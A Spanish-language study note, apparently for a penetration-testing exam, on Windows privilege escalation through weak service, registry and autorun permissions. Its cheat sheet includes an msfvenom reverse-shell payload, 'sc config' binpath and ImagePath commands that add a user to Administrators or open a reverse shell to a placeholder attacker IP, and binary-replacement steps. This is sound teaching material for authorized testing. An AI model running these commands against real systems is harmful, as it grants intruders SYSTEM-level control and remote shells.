---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- Las fallas de permisos son poco comunes en software de grandes proveedores, pero frecuentes en software de terceros, código abierto o aplicaciones personalizadas.
- Los servicios de Windows suelen ejecutarse con privilegios de `NT AUTHORITY\SYSTEM`. Si un usuario sin privilegios puede modificar el binario, la configuración o las claves de registro de ese servicio, puede lograr ejecución de código como SYSTEM.
- Existen 5 vectores principales a auditar: (1) ACLs de archivos sobre el binario del servicio, (2) permisos del propio objeto de servicio (SERVICE_ALL_ACCESS), (3) rutas de servicio sin comillas (unquoted service path), (4) ACLs del registro sobre las claves de servicios, (5) binarios de autorun modificables.
- Siempre se debe verificar manualmente (icacls, sc, accesschk, wmic) además de con herramientas automatizadas (SharpUp), en caso de no tener herramientas disponibles en el objetivo.

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| SharpUp (GhostPack) | Audita automáticamente binarios y servicios modificables (ACLs débiles) |
| icacls | Verifica permisos NTFS sobre archivos/directorios |
| accesschk (Sysinternals) | Verifica permisos efectivos sobre servicios y claves de registro |
| sc | Consulta (`qc`/`query`) y modifica (`config`) la configuración de servicios |
| msfvenom | Genera el binario malicioso (reverse shell / add user) para reemplazar el original |
| wmic | Enumera servicios, rutas de binario y modo de inicio (útil para unquoted paths) |
| PowerShell `Set-ItemProperty` | Modifica valores del registro (ej. ImagePath) |
| PowerShell `Get-CimInstance` | Enumera programas de autorun (Win32_StartupCommand) |
| net localgroup | Verifica/confirma membresía en el grupo de administradores locales |

## Metodología Paso a Paso

### Fase 1: Enumeración automatizada
Ejecutar SharpUp como primer paso para detectar de forma rápida binarios de servicio modificables (ACLs de archivo) y servicios modificables (ACLs de servicio).

### Fase 2: ACLs permisivas del sistema de archivos (reemplazo de binario)
1. SharpUp identifica un servicio cuyo binario reside en una carpeta con permisos débiles.
2. Confirmar con `icacls` que `Everyone` / `BUILTIN\Users` tienen `(F)` (Full Control) sobre el directorio/archivo.
3. Generar un binario malicioso con `msfvenom` (reverse shell o añadir usuario admin).
4. Copiar/sobrescribir el binario original con el malicioso.
5. Iniciar el servicio (`sc start`) para ejecutar el payload con los privilegios del servicio (normalmente SYSTEM).

### Fase 3: Permisos de servicio débiles (SERVICE_ALL_ACCESS)
1. Revisar la salida de SharpUp en la sección "Modifiable Services".
2. Verificar con `accesschk` que `Authenticated Users` (o un grupo equivalente) tienen `SERVICE_ALL_ACCESS` sobre el servicio.
3. Confirmar que el usuario actual NO es administrador local (`net localgroup administrators`).
4. Abusar del control total sobre el servicio cambiando el `binpath` para ejecutar un comando arbitrario (ej. añadir usuario a Administradores, o lanzar una reverse shell).
5. Detener el servicio para que el cambio de `binpath` se aplique en el próximo arranque.
6. Iniciar el servicio: aunque devuelva un error (porque el binpath ya no apunta al ejecutable real), el comando malicioso se ejecuta igualmente antes de que el arranque falle.
7. Confirmar el resultado (ej. usuario añadido al grupo de administradores).
8. **Limpieza obligatoria**: revertir el `binpath` al original, detener y reiniciar el servicio, y verificar con `sc query` que vuelve a funcionar normalmente.

### Fase 4: Ruta de servicio sin comillas (Unquoted Service Path)
1. Buscar servicios en modo `Auto`, fuera de `C:\Windows\` y cuya ruta de binario no esté entre comillas (usando `wmic`).
2. Confirmar la ruta exacta del binario con `sc qc <SERVICE_NAME>`.
3. Identificar los posibles "puntos de secuestro" intermedios que Windows probará en orden (cada espacio en la ruta genera un posible ejecutable candidato con extensión `.exe` añadida).
4. Evaluar si se puede escribir en esas rutas intermedias (normalmente requiere privilegios de administrador en la raíz de la unidad o en `Program Files`, por lo que rara vez es explotable).
5. Tener en cuenta que, aunque se logre escribir el archivo, normalmente se necesita reiniciar el servicio (o el sistema) para que se ejecute, lo cual puede no estar al alcance de un usuario sin privilegios.

### Fase 5: ACLs permisivas del registro (claves de servicio)
1. Usar `accesschk` para enumerar permisos del usuario/grupo objetivo sobre `HKLM\System\CurrentControlSet\services`.
2. Buscar entradas con `KEY_ALL_ACCESS`.
3. Si se encuentra una clave de servicio modificable, usar `Set-ItemProperty` para sobrescribir el valor `ImagePath` con un comando/payload malicioso (ej. una reverse shell con `nc.exe`).
4. Reiniciar el servicio para ejecutar el nuevo `ImagePath`.

### Fase 6: Binario de autorun modificable en el registro
1. Enumerar los programas configurados para ejecutarse al inicio de sesión con `Get-CimInstance Win32_StartupCommand`.
2. Revisar la columna `command` para identificar la ruta del ejecutable y el `User` asociado (objetivo de escalada potencial).
3. Verificar permisos de escritura sobre el binario referenciado o su carpeta contenedora.
4. Si es escribible, reemplazar el binario por uno malicioso; se ejecutará la próxima vez que el usuario objetivo inicie sesión, logrando escalada en su contexto.

## Cheat Sheet de Comandos

```powershell
# Ejecutar SharpUp para auditar binarios y servicios modificables (ACLs débiles)
.\SharpUp.exe audit
```

```powershell
# Verificar permisos NTFS sobre el binario/directorio del servicio sospechoso
icacls "<SERVICE_BINARY_PATH>"
```

```cmd
:: Copiar/sobrescribir el binario del servicio con uno malicioso (generado previamente con msfvenom)
cmd /c copy /Y <MALICIOUS_BINARY> "<SERVICE_BINARY_PATH>"

:: Iniciar el servicio para ejecutar el binario reemplazado con los privilegios del servicio
sc start <SERVICE_NAME>
```

```cmd
:: Generar un binario malicioso con msfvenom (ejemplo: reverse shell para Windows)
:: -p payload, LHOST/LPORT atacante, -f formato exe, -o archivo de salida
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe -o <MALICIOUS_BINARY>.exe
```

```cmd
:: Verificar permisos del objeto de servicio (no del archivo) con AccessChk
:: -q omite el banner | -u suprime errores | -v verbose | -c indica que es un servicio | -w solo muestra objetos con acceso de escritura
accesschk.exe /accepteula -quvcw <SERVICE_NAME>
```

```cmd
:: Comprobar si el usuario actual ya es miembro del grupo de administradores locales
net localgroup administrators
```

```cmd
:: Abusar de los permisos de servicio: cambiar el binpath para añadir el usuario actual a Administradores
sc config <SERVICE_NAME> binpath="cmd /c net localgroup administrators <USER> /add"

:: Alternativa: lanzar una reverse shell en lugar de añadir un usuario
sc config <SERVICE_NAME> binpath="cmd /c <MALICIOUS_BINARY_PATH> -e cmd.exe <ATTACKER_IP> <ATTACKER_PORT>"
```

```cmd
:: Detener el servicio para que el nuevo binpath se aplique en el próximo arranque
sc stop <SERVICE_NAME>

:: Iniciar el servicio; aunque falle el arranque (error 1053), el comando del binpath ya se ejecutó
sc start <SERVICE_NAME>
```

```cmd
:: LIMPIEZA: revertir el binpath al ejecutable original del servicio
sc config <SERVICE_NAME> binpath="<ORIGINAL_SERVICE_BINARY_PATH>"

:: Reiniciar el servicio y verificar que vuelve a funcionar
sc start <SERVICE_NAME>
sc query <SERVICE_NAME>
```

```cmd
:: Buscar servicios en modo Auto, fuera de C:\Windows, con ruta de binario SIN comillas
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

```cmd
:: Consultar la configuración detallada de un servicio (ruta exacta del binario, tipo de inicio, cuenta de ejecución)
sc qc <SERVICE_NAME>
```

```cmd
:: Buscar ACLs débiles en el registro para un usuario/grupo específico sobre las claves de servicios
:: -k apunta a una clave de registro | -v verbose | -u suprime errores | -q omite banner | -s recursivo en subclaves | -w solo objetos con acceso de escritura
accesschk.exe /accepteula "<USER>" -kvuqsw hklm\System\CurrentControlSet\services
```

```powershell
# Abusar de una clave de servicio con permisos de escritura en el registro: modificar ImagePath para ejecutar un payload
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME> -Name "ImagePath" -Value "<MALICIOUS_BINARY_PATH> -e cmd.exe <ATTACKER_IP> <ATTACKER_PORT>"
```

```powershell
# Enumerar programas de autorun (startup) y el usuario en cuyo contexto se ejecutan
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Gotchas y Troubleshooting

- `accesschk.exe` requiere aceptar el EULA en la primera ejecución con el flag `/accepteula`, o fallará silenciosamente/pedirá interacción.
- Al iniciar un servicio cuyo `binpath` fue alterado maliciosamente, es **normal y esperado** recibir el error `1053: The service did not respond to the start or control request in a timely fashion`. El comando inyectado en el `binpath` ya se ejecutó antes de que el servicio fallara; no es necesario que el servicio arranque correctamente.
- Caso histórico de referencia: el servicio `UsoSvc` (Update Orchestrator Service) era vulnerable a este mismo patrón de abuso de `binpath` antes del parche de **CVE-2019-1322**. Es un buen ejemplo conceptual de por qué hay que revisar servicios "esenciales" del sistema también.
- **Ruta de servicio sin comillas**: aunque es común encontrar este tipo de configuración, casi nunca es explotable en la práctica porque:
  - Crear archivos en la raíz de la unidad (`C:\`) o en `C:\Program Files` normalmente requiere privilegios administrativos.
  - Incluso logrando escribir el archivo, se necesita reiniciar el servicio (o el sistema completo) para que se ejecute, algo que un usuario sin privilegios suele no poder forzar.
- **Siempre realizar limpieza (cleanup)** tras explotar permisos de servicio: revertir el `binpath`/`ImagePath` al valor original y reiniciar el servicio, dejando el sistema en su estado funcional original. Esto es especialmente relevante en examen, donde se evalúa el reporte y la integridad del sistema objetivo.
- El reemplazo de binario (Fase 2) requiere que el servicio pueda ser iniciado por un usuario sin privilegios (verificar permisos de inicio del servicio, no solo del archivo).
- Antes de explotar permisos de servicio, conviene verificar con `net localgroup administrators` que el usuario actual NO es ya administrador, para confirmar que la escalada es necesaria y luego para validar el éxito de la explotación.
- Las ubicaciones de autorun no se limitan a `HKLM\...\Run`; existen múltiples claves de registro y carpetas de inicio adicionales que deben revisarse exhaustivamente (Run, RunOnce, Startup folders, Winlogon, etc.).